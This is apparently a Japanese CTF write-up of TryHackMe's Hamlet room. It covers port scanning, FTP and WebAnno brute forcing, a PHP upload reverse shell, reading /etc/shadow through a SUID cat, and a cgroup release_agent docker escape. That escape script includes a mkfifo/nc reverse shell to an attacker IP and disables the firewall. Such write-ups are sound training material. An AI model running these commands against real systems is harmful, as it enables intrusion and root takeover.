# Hamlet CTF

https://tryhackme.com/room/hamlet

## Enumeration

```shell
TARGET=10.49.187.34
sudo bash -c "echo $TARGET   hamlet >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 64
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
501/tcp  open  stmf       syn-ack ttl 64
8000/tcp open  http-alt   syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

```sh
sudo nmap -sV -p21,22,80,501,8000,8080 $TARGET

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        lighttpd 1.4.45
501/tcp  open  nagios-nsca Nagios NSCA
8000/tcp open  http        Apache httpd 2.4.48 ((Debian))
8080/tcp open  http-proxy
```

FTP, SSH, HTTP, Nagios NSCA, HTTP, HTTP

今回はどうか分からないが、Nagios は CVE-2019-15949 で meterpreter を取れたことがあるので念頭に置く。

### FTP

anonymousで2ファイル取得。

```sh
-rw-rw-r--  1 kali kali  113 Sep 15  2021 password-policy.md
-rw-rw-r--  1 kali kali 1425 Sep 15  2021 ufw.status
```

パスワードポリシー

```sh
$ cat ./password-policy.md                                                                                                                              
# Password Policy

## WebAnno

New passwords should be:

- lowercase
- between 12 and 14 characters long
```

ufw 設定

```sh
$ cat ufw.status          
Status: active

To                         Action      From
--                         ------      ----
20/tcp                     ALLOW       Anywhere                  
21/tcp                     ALLOW       Anywhere                  
22/tcp                     ALLOW       Anywhere                  
80/tcp                     ALLOW       Anywhere                  
501/tcp                    ALLOW       Anywhere                  
8080/tcp                   ALLOW       Anywhere                  
8000/tcp                   ALLOW       Anywhere                  
1603/tcp                   ALLOW       Anywhere                  
1564/tcp                   ALLOW       Anywhere                  
50000:50999/tcp            ALLOW       Anywhere                  
20/tcp (v6)                ALLOW       Anywhere (v6)             
21/tcp (v6)                ALLOW       Anywhere (v6)             
22/tcp (v6)                ALLOW       Anywhere (v6)             
80/tcp (v6)                ALLOW       Anywhere (v6)             
501/tcp (v6)               ALLOW       Anywhere (v6)             
8080/tcp (v6)              ALLOW       Anywhere (v6)             
8000/tcp (v6)              ALLOW       Anywhere (v6)             
1603/tcp (v6)              ALLOW       Anywhere (v6)             
1564/tcp (v6)              ALLOW       Anywhere (v6)             
50000:50999/tcp (v6)       ALLOW       Anywhere (v6)
```

### 80

- `Michael 'ghost' Canterbury`
- `ghost@webanno.hamlet.thm`
- ハムレットの語彙に強い関心があるとの示唆（hamlet.txt のリンクあり）

robots.txt にフラグ１があった。

```sh
User-agent: *
Allow: /

THM{...}
```

ドメイン名が出ていたのでVHOSTを調べたが、何も出なかった。

```shell
 ffuf -u http://hamlet.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.hamlet.thm' -fs 1011
```

hamlet.txt から12文字から14文字の単語を抽出、小文字化してワードリストを作る。

```sh
tr 'A-Z' 'a-z' < hamlet.txt | awk '{ for(i=1;i<=NF;i++) if(length($i)>=12 && length($i)<=14) print $i }' | sort | uniq > words.txt
```

michael をFTPでブルートフォースしたが、空振り。

```sh
hydra -l michael -P ./words.txt $TARGET ftp -t 30
```

アルファベット以外を除外する形にしても同じ。ghost にしても同じ。

```sh
$ tr -cs 'A-Za-z' '\n' < hamlet.txt | tr 'A-Z' 'a-z' | awk 'length($0) >= 12 && length($0) <= 14' | sort | uniq > words2.txt
```

### 8000

iframe を使って hamlet.txt を表示している。何に使うか不明。

```html
<iframe style="width:100%; height:100%" src="/repository/project/0/document/0/source/hamlet.txt"></iframe>
```

### 8080　WebAnno

ブルートフォースはここで実行すべきと思われる。

```html
WebAnno --
3.6.7 (2021-02-27 22:50:33, build afd15dd9ef6da4b4e37713caf06ebd2699cad2ef)
```

ffuf を使ったらレート制限か、応答がなくなってVM再起動が必要になった。  
Burp Intruder を使って、ghost ユーザーのパスワードが判明した。

ログインして、ophelia というユーザー名を確認。

pentest.php をドキュメントとしてインポートし、http://hamlet:8000/repository/project/0/document/1/source/pentest.php でPHPを実行できた。

```sh
$ nc -lnvp 8888       
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.49.164.176] 46940
Linux 66505608bd11 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 GNU/Linux
 04:26:09 up  1:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

/stage でフラグ４を発見。２と３をどこかで見落としている。

```sh
$ ls -al stage
total 12
drwxr-xr-x 2 root root 4096 Sep 15  2021 .
drwxr-xr-x 1 root root 4096 Sep 15  2021 ..
-rw-r--r-- 1 root root   29 Sep 16  2021 flag
```

WebAnno上でopheliaのパスワードを変更しログイン。編集中のノートにパスワードが表示されていた。それを使ってFTPに接続すると、フラグ３が入っていた。

```sh
$ ftp hamlet
Connected to hamlet.
220 (vsFTPd 3.0.3)
Name (hamlet:kali): ophelia
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||50862|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Sep 15  2021 .
drwxr-xr-x    5 0        0            4096 Sep 15  2021 ..
-rw-r--r--    1 1001     1001           31 Sep 16  2021 flag
```

cd で親ディレクトリに移動できる。

```sh
ftp> cd ..
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||50865|)
150 Here comes the directory listing.
drwxr-xr-x    5 0        0            4096 Sep 15  2021 .
drwxr-xr-x   24 0        0            4096 Sep 15  2021 ..
drwxr-xr-x    2 1002     1002         4096 Sep 15  2021 gravediggers
drwxr-xr-x    2 1001     1001         4096 Sep 15  2021 ophelia
drwxr-xr-x    6 1000     1000         4096 Sep 16  2021 ubuntu
```

サービス定義とPythonファイルが入っていた。

```sh
ftp> cd ../gravediggers
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||50379|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Sep 15  2021 .
drwxr-xr-x    5 0        0            4096 Sep 15  2021 ..
-rwxr-xr-x    1 0        0            1019 Sep 15  2021 gravediggers.py
-rwxr-xr-x    1 0        0             213 Sep 15  2021 gravediggers.service
-rwxr-xr-x    1 0        0          184147 Sep 15  2021 hamlet.txt
```

```sh
$ cat ./gravediggers.service 
[Unit]
Description=Gravediggers

[Service]
WorkingDirectory=/home/gravediggers
ExecStart=/usr/bin/python3 /home/gravediggers/gravediggers.py
User=root
Restart=always

[Install]
WantedBy=multi-user.target 
```

pythonは501ポートの正体だった。フラグ2がそのまま含まれていた。

```python
$ cat ./gravediggers.py
#!/usr/bin/env python3

import socket
import random
import time

with open('hamlet.txt', 'r') as hf:
    hamlet = hf.read()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('0.0.0.0', 501))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f'Connection: {addr}')
        time.sleep(1)

        conn.sendall(b'GRAVEDIGGER\r\n')
        conn.sendall(b'What do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?\r\n')

        while True:
            conn.sendall(b'PENTESTER\r\n')

            data = conn.recv(1024)

            if b'gallows' in data:
                conn.sendall(b"THM{...}\r\n")
                break
            else:
                start = random.randint(0, len(hamlet) - 100)
                end = start + random.randint(1, 100)
                conn.sendall(hamlet[start:end].strip().encode('utf-8'))
                conn.sendall(b'\r\n')

            if not data:
                break
```

cat にSUIDが付いていた。

```sh
 find / -perm -u=s -type f -ls 2>/dev/null
   671704     36 -rwsr-xr-x   1 root     root        35040 Jul 28  2021 /bin/umount
   671683     56 -rwsr-xr-x   1 root     root        55528 Jul 28  2021 /bin/mount
   671652     44 -rwsr-xr-x   1 root     root        43936 Sep 24  2020 /bin/cat
```

/etc/shadow からrootユーザーのハッシュを入手してクラック

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=crypt
```

昇格成功

```sh
id
uid=0(root) gid=0(root) groups=0(root)
```

## docker エスケープ

cgroup ver1

```sh
mount | grep cgroup
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
```

いつものエクスプロイトを入力したら、エラーは出ないが無反応だった。

```sh
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.138.236 7777 >/tmp/f" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

FW無効化が必要だった。

```sh
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "ufw --force disable" >> /exploit
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.138.236 7777 >/tmp/f" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"mkdir: cannot create directory '/tmp/cgrp': File exists
```

ホストOSのrootシェルを取得

```sh
$ nc -lnvp 7777       
listening on [any] 7777 ...
connect to [192.168.138.236] from (UNKNOWN) [10.49.164.176] 41370
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

フラグ６発見。５は？

```sh
# ls -al /root
total 32
drwx------  5 root root 4096 Sep 15  2021 .
drwxr-xr-x 24 root root 4096 Sep 15  2021 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Sep 15  2021 .cache
drwxr-xr-x  3 root root 4096 Sep 15  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Sep 15  2021 .ssh
-rw-r--r--  1 root root   55 Sep 16  2021 flag
```

ゲストOSの/rootにフラグ５があった。

```sh
ls -al /root
total 20
drwx------ 1 root root 4096 Sep 15  2021 .
drwxr-xr-x 1 root root 4096 Dec 11 05:25 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
```

## 振り返り

- dockerエスケープで、ufwを無効化するのは勉強になった
- `$y$` のハッシュは yescrypt で、最新・最強クラスのハッシュ。hashcat 非対応。

## Tags

#tags:puzzle #tags:ブルートフォース
